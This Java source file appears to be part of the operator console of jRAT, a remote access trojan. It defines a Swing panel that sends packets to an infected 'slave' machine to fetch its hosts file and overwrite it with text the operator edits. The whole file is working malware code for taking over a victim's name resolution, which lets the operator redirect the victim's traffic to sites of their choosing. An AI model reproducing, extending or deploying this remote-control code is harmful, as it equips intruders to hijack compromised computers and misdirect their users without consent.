package su.jrat.client.ui.panels;

import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;

import javax.swing.GroupLayout;
import javax.swing.GroupLayout.Alignment;
import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JScrollPane;
import javax.swing.JSeparator;
import javax.swing.JTextPane;
import javax.swing.LayoutStyle.ComponentPlacement;
import javax.swing.SwingConstants;

import su.jrat.client.ErrorDialog;
import su.jrat.client.Slave;
import su.jrat.client.packets.outgoing.Packet55HostsFile;
import su.jrat.client.packets.outgoing.Packet56UpdateHostsFile;
import su.jrat.client.utils.Utils;
import su.jrat.common.OperatingSystem;


@SuppressWarnings("serial")
public class PanelControlHostsFile extends PanelControlParent {

	private JTextPane txt;
	public boolean waitingAnswer;

	public JTextPane getPane() {
		return txt;
	}

	public PanelControlHostsFile(Slave slave) {
		super(slave);
		final Slave sl = slave;

		JScrollPane scrollPane = new JScrollPane();

		JButton btnClear = new JButton("Clear");
		btnClear.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				txt.setText("");
			}
		});
		btnClear.setIcon(new ImageIcon(PanelControlHostsFile.class.getResource("/icons/clear.png")));

		JButton btnGetHostsFile = new JButton("Get hosts file");
		btnGetHostsFile.setIcon(new ImageIcon(PanelControlHostsFile.class.getResource("/icons/get_host.png")));
		btnGetHostsFile.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				sl.addToSendQueue(new Packet55HostsFile());
			}
		});

		JButton btnUpdateHostsFile = new JButton("Update hosts file");
		btnUpdateHostsFile.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				if (Utils.yesNo("Confirm", "Are you sure you want to update the hosts file?")) {
					sl.addToSendQueue(new Packet56UpdateHostsFile(txt.getText()));
					waitingAnswer = true;
				}
			}
		});
		btnUpdateHostsFile.setIcon(new ImageIcon(PanelControlHostsFile.class.getResource("/icons/host.png")));

		JButton btnGetLocalHosts = new JButton("Get local hosts file");
		btnGetLocalHosts.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				try {
					File file = null;
					
					if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
						file = new File(System.getenv("SystemDrive") + "\\Windows\\System32\\drivers\\etc\\hosts");
					} else if (OperatingSystem.getOperatingSystem() == OperatingSystem.OSX) {
						file = new File("/private/etc/hosts");
					} else {
						file = new File("/etc/hosts");
					}

					if (file != null) {
						BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(file)));
						String line;
						String text = "";
						while ((line = reader.readLine()) != null) {
							text += line + "\n";
						}
						reader.close();
						txt.setText(text);
					}
				} catch (Exception ex) {
					ex.printStackTrace();
					ErrorDialog.create(ex);
				}
			}
		});
		btnGetLocalHosts.setIcon(new ImageIcon(PanelControlHostsFile.class.getResource("/icons/left.png")));

		JSeparator separator = new JSeparator();
		separator.setOrientation(SwingConstants.VERTICAL);

		GroupLayout groupLayout = new GroupLayout(this);
		groupLayout.setHorizontalGroup(
			groupLayout.createParallelGroup(Alignment.LEADING)
				.addGroup(groupLayout.createSequentialGroup()
					.addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 599, GroupLayout.PREFERRED_SIZE)
					.addContainerGap(GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
				.addGroup(groupLayout.createSequentialGroup()
					.addContainerGap()
					.addComponent(btnClear)
					.addPreferredGap(ComponentPlacement.RELATED)
					.addComponent(btnGetHostsFile)
					.addPreferredGap(ComponentPlacement.RELATED)
					.addComponent(btnGetLocalHosts)
					.addPreferredGap(ComponentPlacement.RELATED)
					.addComponent(separator, GroupLayout.PREFERRED_SIZE, 1, GroupLayout.PREFERRED_SIZE)
					.addPreferredGap(ComponentPlacement.RELATED)
					.addComponent(btnUpdateHostsFile)
					.addContainerGap(101, Short.MAX_VALUE))
		);
		groupLayout.setVerticalGroup(
			groupLayout.createParallelGroup(Alignment.LEADING)
				.addGroup(groupLayout.createSequentialGroup()
					.addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 301, GroupLayout.PREFERRED_SIZE)
					.addPreferredGap(ComponentPlacement.UNRELATED)
					.addGroup(groupLayout.createParallelGroup(Alignment.LEADING)
						.addGroup(groupLayout.createParallelGroup(Alignment.BASELINE)
							.addComponent(btnClear)
							.addComponent(btnGetHostsFile)
							.addComponent(btnGetLocalHosts))
						.addComponent(separator, GroupLayout.PREFERRED_SIZE, 23, GroupLayout.PREFERRED_SIZE)
						.addComponent(btnUpdateHostsFile))
					.addContainerGap(13, Short.MAX_VALUE))
		);

		txt = new JTextPane();
		scrollPane.setViewportView(txt);
		setLayout(groupLayout);
	}
}
